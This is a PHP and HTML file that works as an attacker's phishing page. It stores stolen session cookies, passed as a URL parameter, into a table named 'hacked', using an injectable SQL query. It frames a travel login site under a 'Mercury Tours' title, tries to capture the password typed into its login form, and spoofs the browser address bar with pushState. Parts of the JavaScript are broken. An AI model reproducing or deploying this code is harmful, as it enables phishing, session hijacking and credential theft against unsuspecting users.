<?php
if (isset($_GET["cookie"])){
	include "credentials.php";
	$cookie = $_GET["cookie"] ?? '';
	$sql = "INSERT into hacked values ('$cookie');";
	mysqli_query($conn,$sql);
	header("Location: /iframe.php");
}
?>
<html>
	<head>
		<title>Welcome: Mercury Tours</title>
	  <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
	</head>
	<body style="margin:0;padding:0;width:100%;height:100%;">
		<iframe id="iframe" src="https://travel.cmdctrl.ca:8443" scrolling="no" style="width: 100%;height: 100%; overflow: hidden;border: none;"></iframe>
	
		<script type="text/javascript">
			$("#iframe").find("#login_form").submit(function(e){
				console.log("form submited");
				console.log($("input[type='password']").value());
				return true;
			});
			window.history.pushState("object or string", "Title", "https://travel.cmdctrl.ca:8443");
		</script>
	</body>
</html>